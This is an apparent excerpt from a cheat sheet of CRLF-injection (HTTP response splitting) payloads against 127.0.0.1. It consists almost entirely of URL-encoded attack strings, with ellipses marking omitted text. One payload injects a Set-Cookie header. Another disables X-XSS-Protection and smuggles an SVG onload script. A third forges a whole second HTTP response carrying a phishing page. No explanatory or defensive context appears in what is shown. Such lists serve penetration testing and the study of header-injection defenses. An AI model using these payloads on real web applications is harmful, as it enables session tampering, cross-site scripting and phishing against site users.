...
```http
http://127.0.0.1/%0D%0ASet-Cookie:mycookie=myvalue
```
...
Location: http://127.0.0.1/[INJECTION STARTS HERE]
...
```powershell
http://127.0.0.1/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```
...
Link: <http://127.0.0.1/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0
...
```http
http://127.0.0.1/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```
